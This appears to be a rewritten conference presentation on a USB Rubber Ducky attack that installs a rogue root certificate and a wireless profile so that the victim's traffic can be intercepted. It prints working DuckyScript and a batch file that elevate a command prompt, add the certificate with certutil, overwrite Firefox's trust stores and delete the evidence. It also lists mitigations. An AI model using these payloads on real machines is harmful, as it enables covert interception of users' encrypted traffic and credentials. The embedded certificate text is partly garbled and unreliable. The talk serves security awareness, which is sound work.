# USB Attack to Decrypt Wi-Fi Communications

**Presented by: Jeremy Dorrough**

## Disclaimer
The opinions expressed in this presentation are my own and do not necessarily reflect the views of Genworth or any other organization.

## About Me
- Over 10 years of experience in the IT Security industry
- Worked in defense, utility, and financial sectors
- Currently a Network Security Engineer at Genworth
- Enthusiast for automotive safety testing (crash cars for fun)

## Presentation Outline
1. **USB Rubber Ducky**
2. **How the Attack Works**
3. **Keyboard Payload**
4. **Mass Storage/Keyboard Payload**
5. **Demo**
6. **Questions**

## USB Rubber Ducky
### Image Source: [iwishisaidthat.com](http://iwishisaidthat.com)
### Firmware Options
- **Duck**: Keyboard Input
- **FAT Duck**: Mass Storage Device
- **Detour Duck**: Multiple Payloads
- **Twin Duck**: Both Keyboard and Mass Storage Device

### Teensy
- GitHub Repository: [Psychson](https://github.com/adamcaudill/Psychson)

## How the Attack Works
- **Social Engineering**: A study by DHS and idappcom found that:
  - 60% of people plug in a dropped USB device.
  - 90% of people plug in a USB device if it has an official logo.
  - Source: [Bloomberg News](http://www.bloomberg.com/news/articles/2011-06-27/human-errors-fuel-hacking-as-test-shows-nothing-prevents-idiocy)

### The Cat and Mouse Game
- **Defensive Measures**:
  - Anti-Virus
  - Web Filters/Proxy
  - FTP Whitelist
  - HTTP Strict Transport Security (HSTS)

### Setting Up a Rogue Access Point
- **Tools**:
  - Hostapd
  - dnsmasq
  - Iptables
  - Alternatively, use the mana-toolkit

### Setting Up a Man-in-the-Middle (MITM) Listener
- **Configure a proxy** (e.g., Burpsuite, Squid, SSLStrip, Mallory)
- **Export and convert the certificate** to base64 encoding

```plaintext
-----BEGIN CERTIFICATE-----
MIICxDCCAi2gAwIBAgIEVOdW+zANBgkqhkiG9w0BAQUFADCBijEUMBIGA1UEBhML
UG9ydFN3aWdnZXIxFDASBgNVBAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0
U3dpZ2dlcjEUMBIGA1( )gQWBBTSJrL4vz7JJPJ67CNmrwAnfuTs0zANBgkqhkiG9w0B
AQUFAAOBgQCBMulw4WP++I76bfvXQ4RAgNo0DYiasfw4SniawhnfpDE4spV1vjzf
IbQQVcetDdnCvSB6YVE0Rv3HQbTZE5r170dOvl4o6Yr3wgFF9sUUqQq+M/Z4wRgg
8OJPgC8PXCmkelAO166m4w7h3DlnQj1cGNdQr5AmMksvEmDvioTz0A==
-----END CERTIFICATE-----
```

### Burpsuite Proxy Settings
- Configure Burpsuite to act as a proxy listener

## Payload Summary
1. Bypass UAC and open CMD.exe
2. Create a new .cer file from keyboard input
3. Add cert.cer to trusted root using certutil
4. Create a wireless profile
5. Connect to the wireless profile
6. Clean up

### Ducky Script API
- **DELAY [time in milliseconds]**
- **STRING [standard keyboard entry]**
- **ENTER [Enter key]**
- **GUI [Windows key]**
- **REM [comment, will not be processed]**

- GitHub: [DuckyScript Wiki](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript)

### Bypass UAC and Open CMD.exe
```plaintext
DELAY 10000
GUI r
DELAY 200
STRING powershell Start-Process cmd -Verb runAs
```
- Code used from Darren Kitchen’s UAC bypass

### Create Base64 Certificate
```plaintext
STRING copy con cert.cer
ENTER
STRING -----BEGIN CERTIFICATE-----
ENTER
STRING MIICxDCCAi2gAwIBAgIEVOdW+zANBgkUMBIGA1UEBhML
ENTER
STRING UG9ydFN3aWdnZXIxFDASBgNVBAgTC1BvcnRTd2EwtQb3J0
(…)
```

### Add Trusted Certificate
```plaintext
STRING certutil -addstore -f -enterprise -user root cert.cer
```

### Echo XML Network Profile to a File
- Using the XML file, create and connect to a new wireless profile

### Cover Your Tracks
- Delete the XML file
- Delete the rogue certificate

### Twin Duck Firmware
- Mounts both mass storage and HID keyboard
- Requires reflashing the USB Rubber Ducky
- Use only if the target allows mass storage devices
- Micro SD card not ideal for fast I/O

### Create New Firefox Truststore
- Add Trusted CA to a fresh build of Firefox
- Path: `%APPDATA%\Mozilla\Firefox\Profiles\*.default`
- Keystore: `key3.db`
- Truststore: `cert8.db`

### Twin Duck Attack Summary
1. Bypass UAC and open CMD.exe
2. Create script to identify storage mount
3. Create vbs script to run batch file invisibly
4. Run batch file
   - Adds cert to Windows Trusted Root
   - Overwrites Firefox `cert8.db` and `key3.db` files
   - Creates wireless profile
   - Connects to the wireless profile

### Trusted-cert.bat
```batch
taskkill /IM Firefox.exe /F
copy /Y %DUCKYdrive%\cert.cer %USERPROFILE%\cert.cer
certutil -addstore -f -enterprise -user root cert.cer
del cert.cer
cd %APPDATA%\Mozilla\Firefox\Profiles\*.default
copy /Y cert8.db cert8.db.original
copy /Y %DUCKYdrive%\cert8.db cert8.db
copy /Y key3.db key3.db.original
copy /Y %DUCKYdrive%\key3.db key3.db
E:\DUCKY
```

### Mitigating Controls
- Wireless Intrusion Prevention System (WIPS)
- Disable mass storage devices
- Disable USB ports
- User training to encourage responsible USB usage
- Multifactor Authentication
- Cloud Proxy Agent

### Demonstration
- Considerations:
  - Use proxy settings pointed to a cloud listener
  - Increase authenticity
  - Syntax changes for different operating systems
  - New payloads frequently released on HAK5 forums

### Questions
- Email: [PI:EMAIL]

---

This version of the presentation is more structured, with clearer headings and a more professional tone. It also includes proper citations and a more organized layout.